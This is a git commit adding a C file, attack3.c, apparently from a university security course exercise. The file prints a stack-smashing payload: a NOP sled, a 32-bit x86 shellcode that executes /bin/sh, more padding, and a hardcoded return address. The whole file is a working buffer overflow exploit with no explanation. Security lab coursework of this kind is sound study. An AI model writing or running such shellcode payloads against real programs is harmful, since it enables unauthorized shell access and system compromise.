173c3ce50b0c4c0c9eacbddd354a121adab785eb
Chih-Chao Chang <cchan113@jhu.edu>
2016-11-02 20:51:38 -0400

    Create attack3.c

---
+++ attack3.c
@@ -0,0 +1,27 @@
+#include <stdio.h>
+
+int main(int argc, char *argv[])
+{
+
+static char shellcode[] =
+  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
+  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
+  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
+
+ int i;
+ for(i=0;i<70;i++){
+	printf("\x90");
+ }
+
+ printf("%s",shellcode);
+ 
+ for(i=0;i<73;i++){
+ 	printf("\x90");
+ }
+ 
+ printf("\xf8\xf6\xff\xbf");
+ printf("\x80");
+ 
+ return 0;
+}
+
